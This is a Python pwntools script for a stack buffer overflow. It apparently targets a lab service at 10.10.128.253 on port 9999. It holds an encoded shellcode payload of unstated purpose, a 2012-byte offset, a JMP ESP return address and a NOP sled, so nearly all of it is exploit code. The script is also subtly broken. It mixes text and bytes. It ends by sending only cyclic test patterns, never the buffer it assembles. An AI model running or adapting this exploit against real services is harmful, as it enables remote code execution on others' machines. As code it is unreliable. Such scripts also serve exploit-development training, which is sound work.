#!/usr/bin/python3

from pwn import *
import struct

context.log_level = 'critical'

host, port = '10.10.128.253', 9999

shellcode =  b""
shellcode += b"\xb8\x64\x9d\xd2\x37\xda\xd4\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e"
shellcode += b"\x03\x27\x93\x30\xc2\x5b\x43\x36\x2d\xa3\x94"
shellcode += b"\x57\xa7\x46\xa5\x57\xd3\x03\x96\x67\x97\x41"
shellcode += b"\x1b\x03\xf5\x71\xa8\x61\xd2\x76\x19\xcf\x04"
shellcode += b"\xb9\x9a\x7c\x74\xd8\x18\x7f\xa9\x3a\x20\xb0"
shellcode += b"\xbc\x3b\x65\xad\x4d\x69\x3e\xb9\xe0\x9d\x4b"
shellcode += b"\xf7\x38\x16\x07\x19\x39\xcb\xd0\x18\x68\x5a"
shellcode += b"\x6a\x43\xaa\x5d\xbf\xff\xe3\x45\xdc\x3a\xbd"
shellcode += b"\xfe\x16\xb0\x3c\xd6\x66\x39\x92\x17\x47\xc8"
shellcode += b"\xea\x50\x60\x33\x99\xa8\x92\xce\x9a\x6f\xe8"
shellcode += b"\x14\x2e\x6b\x4a\xde\x88\x57\x6a\x33\x4e\x1c"
shellcode += b"\x60\xf8\x04\x7a\x65\xff\xc9\xf1\x91\x74\xec"
shellcode += b"\xd5\x13\xce\xcb\xf1\x78\x94\x72\xa0\x24\x7b"
shellcode += b"\x8a\xb2\x86\x24\x2e\xb9\x2b\x30\x43\xe0\x23"
shellcode += b"\xf5\x6e\x1a\xb4\x91\xf9\x69\x86\x3e\x52\xe5"
shellcode += b"\xaa\xb7\x7c\xf2\xcd\xed\x39\x6c\x30\x0e\x3a"
shellcode += b"\xa5\xf7\x5a\x6a\xdd\xde\xe2\xe1\x1d\xde\x36"
shellcode += b"\xa5\x4d\x70\xe9\x06\x3d\x30\x59\xef\x57\xbf"
shellcode += b"\x86\x0f\x58\x15\xaf\xba\xa3\xfe\xda\x32\xa3"
shellcode += b"\x4f\xb2\x40\xb3\x8c\x6a\xcc\x55\xb8\x7c\x98"
shellcode += b"\xce\x55\xe4\x81\x84\xc4\xe9\x1f\xe1\xc7\x62"
shellcode += b"\xac\x16\x89\x82\xd9\x04\x7e\x63\x94\x76\x29"
shellcode += b"\x7c\x02\x1e\xb5\xef\xc9\xde\xb0\x13\x46\x89"
shellcode += b"\x95\xe2\x9f\x5f\x08\x5c\x36\x7d\xd1\x38\x71"
shellcode += b"\xc5\x0e\xf9\x7c\xc4\xc3\x45\x5b\xd6\x1d\x45"
shellcode += b"\xe7\x82\xf1\x10\xb1\x7c\xb4\xca\x73\xd6\x6e"
shellcode += b"\xa0\xdd\xbe\xf7\x8a\xdd\xb8\xf7\xc6\xab\x24"
shellcode += b"\x49\xbf\xed\x5b\x66\x57\xfa\x24\x9a\xc7\x05"
shellcode += b"\xff\x1e\xf7\x4f\x5d\x36\x90\x09\x34\x0a\xfd"
shellcode += b"\xa9\xe3\x49\xf8\x29\x01\x32\xff\x32\x60\x37"
shellcode += b"\xbb\xf4\x99\x45\xd4\x90\x9d\xfa\xd5\xb0"

offset = 2012
buff_len = 3000
jmp_esp = 0x625014df

buff = ""
buff += "a" * offset
buff += struct.pack("<I", jmp_esp)
buff += "\x90" * 20
buff += shellcode
buff += "C" * (buff_len / len(buff))

s = remote(host, port)


print(s.recvuntil(": "))
s.sendline(cyclic(10000))
print(s.recv())
s.sendline(cyclic(100))
print(s.recv())


s.close()